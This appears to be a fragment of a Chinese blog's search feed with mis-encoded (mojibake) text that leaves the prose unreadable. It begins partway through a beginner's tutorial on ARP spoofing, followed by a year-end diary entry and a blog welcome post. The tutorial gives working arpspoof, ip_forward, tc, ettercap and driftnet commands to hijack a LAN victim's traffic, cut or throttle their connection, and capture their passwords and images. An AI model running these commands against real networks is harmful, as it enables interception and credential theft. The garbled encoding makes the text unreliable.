‡ä¸»æœºå‘é€ARPæŠ¥æ–‡ï¼Œä½¿å¾—å±€åŸŸç½‘å†…çš„ä¸»æœºè¯¯ä»¥ä¸ºæ¬ºéª—æºçš„MACåœ°å€æ˜¯ç½‘å…³MACåœ°å€ï¼Œå¹¶å°†åŸæœ¬åº”è¯¥æµå‘ç½‘å…³çš„æ•°æ®éƒ½å‘é€åˆ°æ¬ºéª—æºã€‚</p><blockquote><p>ç›´æ¥å¯¹é¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h6 id="2-ä¼ªè£…æˆä¸»æœº"><a href="#2-ä¼ªè£…æˆä¸»æœº" class="headerlink" title="2.ä¼ªè£…æˆä¸»æœº"></a>2.ä¼ªè£…æˆä¸»æœº</h6><p>ç”¨æ¥æ¬ºéª—å±€åŸŸç½‘å†…çš„å…¶ä»–æ‰€æœ‰ä¸»æœº</p><p>æ¬ºéª—æºå°†è‡ªå·±ä¼ªè£…æˆå±€åŸŸç½‘å†…çš„å¦ä¸€å°ä¸»æœº3ï¼Œå°†ä¸»æœº3çš„IPåœ°å€å¯¹åº”çš„MACåœ°å€æ›¿æ¢ä¸ºæ¬ºéª—å…ƒçš„IPåœ°å€å¯¹åº”çš„MACåœ°å€ä½¿å¾—å±€åŸŸç½‘å†…é¶æœºå‘å¾€ä¸»æœº3çš„æŠ¥æ–‡éƒ½æµå‘æ¬ºéª—æº</p><blockquote><p>åˆ†åˆ«å¯¹ç½‘å…³å’Œé¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h3 id="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"><a href="#æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰" class="headerlink" title="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"></a>æ“ä½œæ­¥éª¤<del>ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰</del></h3><blockquote><p>ä¼ªè£…æˆç½‘å…³</p></blockquote><p>é¦–å…ˆæŸ¥çœ‹æ¬ºéª—æºå’Œé¶æœºçš„IPåœ°å€</p><ul><li><p>ç›´æ¥æŸ¥çœ‹ï¼škaliå‘½ä»¤çª—å£è¾“å…¥<code>ifconfig</code>ï¼ŒWindowså‘½ä»¤çª—å£è¾“å…¥<code>ipconfig</code></p></li><li><p>æ­£ç»æ–¹æ³•ï¼š</p><p>1.åœ¨kaliå‘½ä»¤çª—å£è¾“å…¥<code>fping -g xxx.xxx.xxx[ç½‘ç»œå·ç ].1/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP </p><p>2.è¾“å…¥å‘½ä»¤<code>nmap -sP xxx.xxx.xxx[ç½‘ç»œå·ç ].0/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP</p></li></ul><p>è¾“å…¥å‘½ä»¤<code>route-n</code>æŸ¥çœ‹ç½‘å…³</p><p>ä½¿ç”¨arpspoofè¡Œéª—</p><blockquote><p>kaliå‘½ä»¤çª—å£è¾“å…¥sudo arpspoof -hæŸ¥çœ‹å·²ç»å®‰è£…çš„arpspoofç‰ˆæœ¬å·ï¼Œå¦‚æœæœªå®‰è£…ï¼Œç³»ç»Ÿä¼šå¼¹å‡ºæç¤ºï¼ŒæŒ‰ç…§æç¤ºå®‰è£…å³å¯ </p></blockquote><p>æ–­ç½‘æ“ä½œ</p><p>æŠŠé¶æœºå‘å‡ºçš„è¯·æ±‚æ¥å—åˆ°æ”»å‡»æºä¸»æœºï¼Œå› ä¸ºlinuxé»˜è®¤ip_forwardä¸º0ï¼Œå³ä¸è¿›è¡Œæµé‡è½¬å‘ï¼Œæ‰€ä»¥é¶æœºä¼šæ–­ç½‘</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©é¶æœºè®¤ä¸ºæ”»å‡»æºä¸ºç½‘å…³ï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…åå‘æ¬ºéª—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©ç½‘å…³è®¤ä¸ºæ”»å‡»æºæ˜¯é¶æœºï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç½‘å…³]</span> <span class="hljs-selector-attr">[ç›®æ ‡IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>ç½‘å¡é»˜è®¤eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>æŸ¥çœ‹ip_forwardçš„å€¼ã€‚å¦‚æœip_forwardä¸º0ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºä¸èƒ½ä¸Šç½‘ï¼›å¦‚æœip_forwardä¸º1ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºå¯ä»¥ä¸Šç½‘</p><p>ä¿®æ”¹æ•°å€¼è®©ä»–ä¸Šç½‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>æƒé™ä¸å¤Ÿå°±<code>sudo -i</code> ä½¿ç”¨rootæƒé™æ”¹</p></blockquote><p>é™åˆ¶ç½‘é€Ÿ</p><p>å¯ä»¥ä½¿ç”¨çš„å·¥å…·æœ‰tcã€iptablesã€WonderShaperç­‰ç­‰ï¼Œ</p><p>ä»¥tcä¸ºä¾‹<del>æœ¬èœé¸¡è¿˜æ²¡å­¦ä¼šåä¸¤ä¸ª</del>ğŸ˜¢ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">é™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>å–æ¶ˆé™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>æ‹¦æˆªæ•°æ®â€”è·å–æµè§ˆç½‘é¡µåŠè´¦å·å¯†ç </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><p>å—…æ¢å›¾ç‰‡</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="å·¥å…·è¯´æ˜ä¹¦"><a href="#å·¥å…·è¯´æ˜ä¹¦" class="headerlink" title="å·¥å…·è¯´æ˜ä¹¦"></a>å·¥å…·è¯´æ˜ä¹¦</h3><p>å› ä¸ºå„ç§å·¥å…·çš„ä½¿ç”¨è¯´æ˜éƒ½æ˜¯è‹±æ–‡çš„ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨ä¸‡èƒ½çš„äº’è”ç½‘æœäº†ä¸€ä¸‹ä¸­æ–‡çš„ä½¿ç”¨æŒ‡å—ï¼š</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">è¯­æ³•ï¼š driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  æ•è·åˆ°æ–°çš„å›¾ç‰‡æ—¶å‘å‡ºå˜Ÿå˜Ÿå£°<br> -<span class="hljs-selector-tag">i</span>  interface     é€‰æ‹©ç›‘å¬æ¥å£<br> -f  file   è¯»å–ä¸€ä¸ªæŒ‡å®špcapæ•°æ®åŒ…ä¸­çš„å›¾ç‰‡<br> -<span class="hljs-selector-tag">p</span>  ä¸è®©æ‰€ç›‘å¬çš„æ¥å£ä½¿ç”¨æ··æ‚æ¨¡å¼<br> -<span class="hljs-selector-tag">a</span>  åå°æ¨¡å¼ï¼šå°†æ•è·çš„å›¾ç‰‡ä¿å­˜åˆ°ç›®å½•ä¸­ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼‰<br> -m  number æŒ‡å®šä¿å­˜å›¾ç‰‡æ•°çš„æ•°ç›®<br> -d  directory  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„è·¯å¾„<br> -x  prefix  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„å‰ç¼€å<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åå­— <br><span class="hljs-code">       arpspoof - æˆªè·äº¤æ¢å±€åŸŸç½‘ä¸­çš„æ•°æ®åŒ…</span><br><span class="hljs-code"></span><br>ç”¨æ³•<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>æè¿°<br><span class="hljs-code">       arpspoofé€šè¿‡ä¼ªé€ çš„ARPå“åº”åŒ…æ”¹å˜å±€åŸŸç½‘ä¸­ä»ç›®æ ‡ä¸»æœºï¼ˆæˆ–æ‰€æœ‰ä¸»æœºï¼‰åˆ°å¦ä¸€ä¸ªä¸»æœºï¼ˆhostï¼‰çš„æ•°æ®åŒ…è½¬å‘è·¯å¾„ã€‚è¿™æ˜¯äº¤æ¢å±€åŸŸç½‘ä¸­å—…æ¢ç½‘ç»œæµé‡çš„ä¸€ç§æä¸ºæœ‰æ•ˆçš„æ–¹æ³•ã€‚</span><br><span class="hljs-code">       å†…æ ¸IPè½¬å‘ï¼ˆæˆ–å¦‚fragrouterè¿™æ ·çš„ã€ç”¨æˆ·å±‚é¢çš„ã€èƒ½å®ŒæˆåŒæ ·åŠŸèƒ½çš„è½¯ä»¶ï¼‰å¿…é¡»æå‰å¼€å¯ã€‚</span><br><span class="hljs-code"></span><br>å‚æ•°<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              æŒ‡å®šè¦ä½¿ç”¨çš„æ¥å£ï¼ˆå³æŒ‡å®šä¸€å—ç½‘å¡ï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              æŒ‡å®šåœ¨æ¢å¤ARPé…ç½®æ—¶ä½¿ç”¨çš„ç¡¬ä»¶åœ°å€ï¼›å½“åœ¨æ¸…ç†ï¼ˆcleaning upï¼‰æ—¶ï¼Œæ•°æ®åŒ…çš„æºåœ°å€å¯ä»¥ç”¨è‡ªå·±çš„ä¹Ÿå¯ä»¥ç”¨ä¸»æœºï¼ˆhostï¼‰çš„ç¡¬ä»¶åœ°å€ã€‚</span><br><span class="hljs-code">              ä½¿ç”¨ä¼ªé€ çš„ç¡¬ä»¶åœ°å€å¯èƒ½å¯¼è‡´æŸäº›é…ç½®ä¸‹çš„äº¤æ¢ç½‘ç»œã€APç½‘ç»œæˆ–æ¡¥æ¥ç½‘ç»œé€šä¿¡ä¸­æ–­ï¼Œç„¶è€Œå®ƒæ¯”èµ·é»˜è®¤å€¼â€”â€”â€”â€”ä½¿ç”¨è‡ªå·±çš„ç¡¬ä»¶åœ°å€è¦å·¥ä½œåœ°æ›´ä¸ºå¯é ã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              æŒ‡å®šä¸€ä¸ªç‰¹æ®Šçš„ã€å°†è¢«ARPæ¯’åŒ–çš„ä¸»æœºï¼ˆå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™è®¤ä¸ºæ˜¯å±€åŸŸç½‘ä¸­æ‰€æœ‰ä¸»æœºï¼‰ã€‚é‡å¤å¯ä»¥æŒ‡å®šå¤šä¸ªä¸»æœºã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     æ¯’åŒ–ä¸¤ä¸ªä¸»æœºï¼ˆç›®æ ‡å’Œä¸»æœºï¼ˆhostï¼‰ï¼‰ä»¥æ•è·ä¸¤ä¸ªæ–¹å‘çš„ç½‘ç»œæµé‡ã€‚ï¼ˆä»…ä»…åœ¨å’Œ-tå‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶æœ‰æ•ˆï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   hostæ˜¯ä½ æƒ³è¦æˆªè·æ•°æ®åŒ…çš„ä¸»æœº (é€šå¸¸æ˜¯ç½‘å…³)ã€‚</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>åé¢è·Ÿç€è¿æ¥å±€åŸŸç½‘çš„ç½‘å¡<br>TæŒ‡çš„æ˜¯textæ–‡æœ¬æ¨¡å¼<br><span class="hljs-selector-tag">q</span>ä»¥å®‰é™æ¨¡å¼æ‰§è¡Œè¿™ä¸ªå‘½ä»¤<br>MæŒ‡å®šæ”»å‡»æ¨¡å¼<br>&gt;&gt;è¾“å‡ºæ–‡ä»¶<br></code></pre></td></tr></table></figure><hr><p>å‘ä¸ªç¬”è®°ä¸Šæ¥ä¸ç„¶è¿™ä¸ªåšå®¢çœŸçš„æˆç¢ç¢å¿µä¸“æ äº†ğŸ˜¶â€ğŸŒ«ï¸</p><p>æˆ‘å°±æ˜¯ä¸ªèœé¸¡ğŸƒ</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¹´ç»ˆæ€»ç»“</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>æƒ³å¥½æ€æ ·å‘Šåˆ«2022äº†å—ï¼ŸğŸ¥°</p><span id="more"></span><p>æˆ‘æ€»æ˜¯å–œæ¬¢åœ¨å¹´æœ«ç»™æœªæ¥ä¸€å¹´çš„è‡ªå·±ç•™ä¸‹ç¥ç¦ï¼Œä»Šå¹´è¿˜æ˜¯åƒå¾€å¹´ä¸€æ ·çš„å¥—è·¯ï¼šå¸Œæœ›2023çš„è‡ªå·±å¯ä»¥æ›´æ´’è„±ã€æ›´è‡ªç”±ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘æ¥åˆ°äº†æ¢¦å¯ä»¥æ±‚çš„åå…«å²ã€‚æˆ‘ä»è¢«å›šç¦åœ¨åº”è¯•æ•™è‚²ä¸­çš„é«˜ä¸­ç”Ÿå˜æˆäº†æ‚ é—²åˆå¿™ç¢Œçš„å¤§å­¦ç”Ÿï¼›æˆ‘è€ƒå‡ºäº†é©¾ç…§ã€å­¦ä¼šäº†å¼¹å‰ä»–ï¼›æˆ‘ç¬¬ä¸€æ¬¡ç¦»å¼€äº†çˆ¶æ¯ã€è¿œç¦»å®¶ä¹¡ï¼Œå¼€å§‹ä½å®¿ç”Ÿæ´»ï¼›æˆ‘äº†è§£åˆ°ä¸åŒçš„ä¸–ç•Œï¼Œçœ‹åˆ°äº†æ–°çš„é£æ™¯ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘å’Œå¾ˆå¤šäººç›¸é‡ï¼Œä¹Ÿå’Œå¾ˆå¤šäººå‘Šåˆ«ã€‚</p><p>è¿™å‡ å¤©æˆ‘æƒ³ä¸ºè‡ªå·±æŒ‘é€‰å¹´åº¦ä¹å›¾ï¼Œäºæ˜¯ä¹æˆ‘ç¿»å‡ºäº†ç½‘ç›˜é‡Œå±äºé«˜ä¸­çš„æ–‡ä»¶å¤¹ã€‚æ¯•ç«Ÿå°±åœ¨ä¸ŠåŠå¹´ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªè¢«è±¢å…»çš„é«˜è€ƒé‡‘ä¸é›€ã€‚æˆ‘æ‰“å¼€çœ‹ï¼Œé‡Œé¢ç››æ»¡äº†æˆ‘é«˜ä¸‰é‚£å¹´ç”¨è€å¤è‘£ç›¸æœºå®šæ ¼çš„é’æ˜¥çƒ­è¡€ã€‚æ–‡ä»¶å¤¹é‡Œæœ‰å­¦æ ¡é‡Œç››å¼€çš„èŠ±ï¼Œé˜³å…‰ä¸‹æƒ¬æ„çš„çŒ«ï¼Œè¿˜æœ‰æ•°ä¸æ¸…çš„æ„æ°”é£å‘çš„å°‘å¹´ã€‚è¿˜è®°å¾—ï¼Œæ™¦æ¶©è€Œåˆç¿çƒ‚çš„é«˜ä¸‰ï¼Œæ¯å¤©æ™šè‡ªä¹ çš„æœ€ååŠå°æ—¶ï¼Œæˆ‘éƒ½æ²¡æœ‰å‘è€å¸ˆå®¶é•¿å®å˜±çš„é‚£èˆ¬æŠ“ç´§æ—¶é—´èƒŒå•è¯ã€å†™å¤§é¢˜ï¼Œæˆ‘æŠŠæ—¶é—´ç”¨æ¥åœ¨æœ¬å­ä¸Šè®°å½•æˆ‘çš„å–œæ€’å“€ä¹ï¼Œä¹¦å†™æˆ‘å¯¹è¿™æ®µæ—¶å…‰çš„ä¸èˆä¸ç•™æ‹ã€‚é«˜ä¸­æ¯•ä¸šï¼Œæˆ‘æ”’äº†ä¸‰æœ¬æ—¥è®°åŠ ä¸€æœ¬éšç¬”ã€‚</p><p>æˆ‘ä»è®°å¾—æ¯•ä¸šé‚£åœºåˆ†åˆ«ï¼Œæˆ‘ä»¬èƒŒç€ä¹¦åŒ…ï¼Œåƒå¹³å¸¸é‚£æ ·è¯´ç€å†è§ã€‚æˆ‘å’Œæœ‹å‹ä»¬æ²¡æœ‰è½°è½°çƒˆçƒˆçš„å‘Šåˆ«ï¼Œåªæœ‰åœ¨è€³è¾¹å¹è¿‡çš„ç‚çƒ­åˆæ½®æ¹¿çš„æ™šé£ï¼Œå’Œçª—å¤–çš„å–§é—¹ä¸æ­¢çš„è‰é¸£ã€‚æˆ‘å°†è®°å½•éšç¬”çš„æœ¬å­å¸¦åˆ°äº†å¤§å­¦ï¼Œå´æœªæ›¾åœ¨ä¸Šé¢å†™ä¸‹ä¸€ä¸ªæ–‡å­—ã€‚æˆ‘åªæ˜¯ä¸€æ¬¡åˆä¸€æ¬¡çš„ç¿»å¼€å®ƒï¼Œå½“ä½œå¤§å­¦ç”Ÿæ´»ä¸­çš„ä¹è¶£ï¼Œå»é‡æ¸©é‚£æ®µå…µè’é©¬ä¹±è€Œåˆæ½‡æ´’è‚†æ„çš„æ—¶å…‰ã€‚å°±åƒæˆ‘åœ¨æœ¬å­é‡Œå†™ä¸‹çš„ç¬¬ä¸€æ®µè¯â€”â€”â€œæˆ‘æ‰€è®°å½•çš„æ¯ä¸€ä¸ªæ–‡å­—ï¼Œéƒ½æ˜¯è¿‡å»çš„æˆ‘å¯¹æœªæ¥çš„èµ ç¤¼â€ã€‚</p><p>å››ä¸ªæœˆçš„å¤§å­¦å¥½åƒç”µå½±èƒ¶å·ï¼Œè¢«æœºå™¨æ‹‰æ‰¯ç€ï¼Œåœ¨æˆ‘çœ¼å‰ä¸€é—ªè€Œè¿‡ï¼Œä½†æ˜¯è¿™æ¡è·¯ä¸Šä»ç„¶æœ‰ç²¾å½©çš„é£æ™¯ã€‚æˆ‘é‡åˆ°äº†æ–°çš„æœ‹å‹ï¼Œå’Œä»–ä»¬åˆ†äº«ä¸åŒçš„å¹¸ç¦ã€‚å…¨æ–°çš„ç”Ÿæ´»å¹¶ä¸æ²¡æœ‰è®©æˆ‘æ„Ÿåˆ°ä¸å®‰ï¼Œæˆ–è®¸æ˜¯éª¨å­é‡Œçš„ç§¯æå‹‡æ•¢ï¼Œå¼‚æˆ–è®¸æ˜¯èº«è¾¹ä¼™ä¼´çš„é¼“åŠ±é™ªä¼´ï¼Œè®©æˆ‘çš„è¿™æ®µæ–°çš„æ—…ç¨‹æ€»æ˜¯å¹³ç¨³ç•…é€šçš„ã€‚ä»å­¦æœŸåˆçš„æ“’æ•Œæ‹³ï¼Œåˆ°å­¦ä¼šçš„æŠ•ç¯®æ¡æ¼æŠ€å·§ï¼Œè¿˜æœ‰ä¸ºäº†äº¤ä½œä¸šå°è¯•çš„æ”¹æºç çš„æ­ªé—¨é‚ªé“ï¼Œå†åˆ°æœŸæœ«ä¸´èµ°å‰å¤œè·å¾—çš„ç¾½æ¯›çƒè€å¸…æŠ€å·§Â·Â·Â·Â·Â·Â·è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½èƒŒåï¼Œéƒ½æœ‰ä¸€ç¾¤æˆ‘éå¸¸æ„Ÿè°¢ç›¸é‡ç›¸è¯†çš„äººã€‚æˆ‘è¿˜æ˜¯ä¸ªå–œæ¬¢æ”¶é›†ç‰©æ–™çš„äººï¼Œå®¿èˆä¹¦æ¡Œä¸Šçš„è½¯æœ¨æ¿ï¼Œé’‰ç€æˆ‘çš„ç¬¬ä¸€å¼ çŒ®è¡€è¯ä¹¦ï¼Œè´´ç€æˆ‘ç¬¬ä¸€æ¬¡éƒ¨é—¨ç ´å†°ä¼šè®®çš„å¡ç‰‡ï¼Œæ¡†æ¶è¾¹ç¼˜é‡Œå¤¹è¿˜æœ‰ä¸´èµ°æ—¶æ”¶åˆ°çš„æ–°å¹´è´ºå¡Â·Â·Â·Â·Â·Â·è¿™äº›ç‰©ä»¶æ‰¿è½½çš„æ•…äº‹æ€»èƒ½åœ¨å›å¿†é‡Œç† ç† ç”Ÿè¾‰ã€‚</p><p>åœ¨å¤œæ·±æ—¶åˆ†ï¼Œæˆ‘ç»å¸¸ä¼šæŠŠè¿™äº›ç¢ç‰‡ä»è®°å¿†æ·±å¤„æ‹å‡ºæ¥ï¼ŒæŠŠä»–ä»¬æ‹¼å‡‘æˆå®Œæ•´çš„æ‹¼å›¾ã€‚</p><p><del>å¥½å§ï¼Œæˆ‘æ‰¿è®¤è‡ªå·±æ€»æ˜¯æ´»åœ¨å›å¿†é‡Œã€‚</del></p><p>æœ€åï¼Œæ„Ÿè°¢2022ï¼Œè®©æˆ‘é‡åˆ°äº†æ„è¶£ç›¸æŠ•çš„äººï¼Œä¹Ÿè®©æˆ‘æ‹¥æœ‰æ»šçƒ«è€Œåˆçƒ­çƒˆçš„è®°å¿†ã€‚</p><p>æ–°çš„ä¸€å¹´ï¼Œæ„¿æˆ‘æ‰€çˆ±ï¼Œå¹³å®‰é¡ºé‚ã€‚ğŸ†</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¹å›­å…¥åœºåˆ¸</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€å¼ ä¹å›­å…¥åœºåˆ¸</p><span id="more"></span><p>æ­å–œä½ å‘ç°äº†å®è—ï¼</p><p>æˆåŠŸæ­å»ºè¿™ä¸ªåšå®¢è¿™æ˜¯æˆ‘ä¸Šå¤§å­¦ä»¥æ¥åšè¿‡æœ€æœ‰æˆå°±æ„Ÿçš„äº‹ã€‚è™½ç„¶è¿‡ç¨‹ä¸­è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ„Ÿè°¢æˆ‘æ²¡æœ‰æ”¾å¼ƒï¼Œæ‰æœ‰äº†ç°åœ¨è¿™ä¸ªå±äºæˆ‘çš„å°å°æä¹ä¸–ç•Œã€‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªModifierçš„å¤‡å¿˜ä»“åº“ï¼Œä¹Ÿæœ‰å¾ˆå¤šæœªçŸ¥å®è—ã€‚</p><hr><p>æœ€è¿‘åœ¨ä¸åœåœ°ä¿®æ”¹æˆ‘çš„æ–‡ç« ï¼Œå°½å¯èƒ½çš„æŠŠæ–‡ç« å†™å¾—ç®€æ´æ˜äº†ã€‚</p><p>ä¸€äº›å¾ˆåŸºç¡€çš„ä¸œè¥¿ä¹Ÿå‘ä¸Šæ¥ï¼Œä¸€æ˜¯æƒ³è®°å½•è‡ªå·±çš„å­¦ä¹ å†ç¨‹ï¼ŒäºŒæ˜¯æƒ³ç€ï¼Œç­‰åˆ°å“ªå¤©æˆ‘çš„æ–‡ç« ä¹Ÿæœ‰äººçœ‹äº†ï¼Œèƒ½è®©äººä¸€ä¸‹å­å°±èƒ½çœ‹å¾—æ˜ç™½ã€‚</p><hr><p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œé‚£å°±ç¥ä½ åœ¨Modifierçš„æä¹ä¸–ç•Œé‡Œäº«å—è‡ªç”±ä¸å¿«ä¹å§ï¼</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
